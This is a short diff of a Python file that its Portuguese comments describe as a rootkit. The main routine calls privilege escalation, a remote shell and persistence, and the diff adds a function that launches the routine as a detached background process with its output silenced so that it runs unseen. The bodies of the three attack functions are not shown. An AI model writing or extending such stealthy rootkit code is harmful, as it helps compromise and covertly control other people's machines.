@@ -7,6 +7,7 @@ import string
 import time
 import random as r
 import sys
+import subprocess
 
 # Importando outros rookit 
 sys.path.append('./src/')
@@ -26,11 +27,19 @@ def persistence():
 def check_root():
     return os.geteuid() == 0
 
-# função principal rootkit 
-def main(): 
+
+# Função principal rootkit 
+def rootkit_main(): 
     elevar_privilegio()
     remote_shell()
     persistence()
 
+# Função para iniciar o rootkit em segundo plano
+def rootkit_init():
+    subprocess.Popen(["python", "-c", "from rookit import rootkit_main; rootkit_main()"],
+                     stdout=open(os.devnull, 'w'),
+                     stderr=open(os.devnull, 'w'),
+                     close_fds=True)
+
 if __name__ == "__main__":
-    main()
+    rootkit_init()
